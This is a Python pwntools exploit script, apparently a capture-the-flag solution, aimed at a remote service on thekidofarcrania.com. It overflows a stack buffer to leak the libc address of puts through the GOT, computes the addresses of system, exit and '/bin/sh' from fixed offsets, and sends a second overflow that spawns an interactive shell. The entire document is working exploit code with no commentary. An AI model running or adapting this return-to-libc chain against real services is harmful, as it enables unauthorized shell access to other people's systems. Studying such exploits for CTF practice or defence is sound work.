from pwn import *
pr = remote('thekidofarcrania.com', 4902)
elf = ELF('./server')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
payload = '\x90'*60
payload += p32(puts_plt)
payload += p32(elf.sym["main"])
payload += p32(puts_got)

pr.sendlineafter("Input some text: ", payload)
pr.readuntil('Return address: ')
pr.readlines(2)
puts_addr = u32(pr.recv(4))
print('puts', hex(puts_addr))

#-------------------------------------------------------------------------

sys_addr = puts_addr - 0x2a940
binsh_addr = puts_addr + 0x11658f
exit_addr = puts_addr - 227184
print('sys', hex(sys_addr))
print('binsh', hex(binsh_addr))
payload = '\x90'*60
payload += p32(sys_addr)
payload += p32(exit_addr)
payload += p32(binsh_addr)

pr.sendlineafter("Input some text: ", payload)

pr.interactive()
